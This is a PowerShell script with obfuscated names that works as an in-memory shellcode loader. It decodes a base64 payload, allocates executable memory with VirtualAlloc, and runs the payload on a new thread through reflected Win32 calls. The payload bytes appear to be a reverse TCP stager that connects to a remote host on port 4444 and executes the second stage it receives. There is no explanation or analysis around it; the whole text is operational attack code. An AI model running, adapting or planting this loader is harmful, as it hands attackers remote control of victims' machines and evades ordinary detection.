
function yGI2 {
	Param ($x1ZhU, $yB7)		
	$h2Z99 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $h2Z99.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($h2Z99.GetMethod('GetModuleHandle')).Invoke($null, @($x1ZhU)))), $yB7))
}

function fSF8lxqLg8 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $xBuzD2WkxF,
		[Parameter(Position = 1)] [Type] $vvdGoQD = [Void]
	)
	
	$mSzEf = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$mSzEf.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $xBuzD2WkxF).SetImplementationFlags('Runtime, Managed')
	$mSzEf.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vvdGoQD, $xBuzD2WkxF).SetImplementationFlags('Runtime, Managed')
	
	return $mSzEf.CreateType()
}

[Byte[]]$coN2k6z = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcke8ppkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$hrP4mws = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yGI2 kernel32.dll VirtualAlloc), (fSF8lxqLg8 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $coN2k6z.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($coN2k6z, 0, $hrP4mws, $coN2k6z.length)

$qnkodJ68 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yGI2 kernel32.dll CreateThread), (fSF8lxqLg8 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$hrP4mws,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yGI2 kernel32.dll WaitForSingleObject), (fSF8lxqLg8 @([IntPtr], [Int32]))).Invoke($qnkodJ68,0xffffffff) | Out-Null
